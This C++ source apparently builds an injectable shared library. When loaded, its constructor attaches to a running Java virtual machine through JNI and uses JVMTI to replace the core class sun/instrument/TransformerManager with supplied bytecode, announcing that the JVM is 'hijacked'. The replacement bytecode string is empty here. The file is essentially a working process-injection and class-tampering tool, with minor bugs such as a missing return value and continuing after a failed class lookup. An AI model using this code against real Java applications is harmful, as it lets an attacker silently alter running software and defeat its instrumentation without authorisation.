#include <iostream>
#include <jni.h>
#include <stdio.h>
#include <dlfcn.h>
#include "jvmti.h"
#include <pthread.h>


const char* targetClassHex = "";
const char* targetClassName = "sun/instrument/TransformerManager";


unsigned char hexToByte(const char* hex) {
    unsigned int byte;
    sscanf(hex, "%02x", &byte);
    return (unsigned char)byte;
}

void hexStringToByteArray(const char* hexString, unsigned char* byteArray, int byteArrayLength) {
    for (int i = 0; i < byteArrayLength; i++) {
        byteArray[i] = hexToByte(hexString + 2 * i);
    }
}

void* library_init(void* arg);

static void __attribute__((constructor))
init() {
    pthread_t tid;
    int err = pthread_create(&tid, NULL, &library_init, NULL);
    if (err != 0) {
        std::cerr << "Failed to create a thread: " << strerror(err) << std::endl;
    }
}

void* library_init(void* arg) {
    JavaVM *vmBuf[1];
    jsize numVMs;
    jvmtiEnv *jvmti;

    jint result = JNI_GetCreatedJavaVMs(vmBuf, 1, &numVMs);

    std::cout << "Number of JVMs found: " << numVMs << std::endl;

    if (result == JNI_OK && numVMs > 0) {
        JavaVM *jvm = vmBuf[0]; // assume one JVM is there
        JNIEnv *env;



        // length of the class bytecode ->  create a byte array
        int length = strlen(targetClassHex) / 2;
        unsigned char classBytes[length];
        hexStringToByteArray(targetClassHex, classBytes, length);

        // try to attach to the JVM
        jint attachResult = jvm->AttachCurrentThread(reinterpret_cast<void **>(&env), nullptr);

        if (attachResult == JNI_OK) {
            printf("JVM attached yay\n");
            jvm->GetEnv((void **) &jvmti, JVMTI_VERSION_1_1);
            jvmtiCapabilities capabilities;
            memset(&capabilities, 0, sizeof(capabilities));
            capabilities.can_redefine_classes = 1; // enabling class redefinition capability

            jvmti->AddCapabilities(&capabilities);

            jclass myClass = env->FindClass(targetClassName);
            if (myClass == nullptr) {
                std::cerr << "Failed to find the class." << std::endl;
                jvm->DetachCurrentThread();
            }

            //class definition structure for redefinition
            jvmtiClassDefinition classDef;
            classDef.klass = myClass;
            classDef.class_byte_count = length;
            classDef.class_bytes = classBytes;

            // if we are here then the jvm is hijacked
            std::cerr << "hijacked. " << std::endl;
            jvmtiError err = jvmti->RedefineClasses(1, &classDef);
            if (err != JVMTI_ERROR_NONE) {
                char *errName = nullptr;
                jvmti->GetErrorName(err, &errName);
                std::cerr << "Failed to redefine the class. JVMTI Error Code: " << err;
                if (errName != nullptr) {
                    std::cerr << " (" << errName << ")";
                    jvmti->Deallocate((unsigned char *) errName);
                }
                std::cerr << std::endl;
            }
            jvm->DetachCurrentThread();
        } else {
            std::cerr << "Failed to attach thread to JVM. Error code: " << attachResult << std::endl;
            switch (attachResult) {
                case JNI_EDETACHED:
                    std::cerr << "Thread not attached to the JVM." << std::endl;
                    break;
                case JNI_EVERSION:
                    std::cerr << "JVM version error." << std::endl;
                    break;
                default:
                    std::cerr << "Unknown error occurred." << std::endl;
            }
        }
    } else {
        std::cerr << "No JVMs found :/" << std::endl;
    }
}
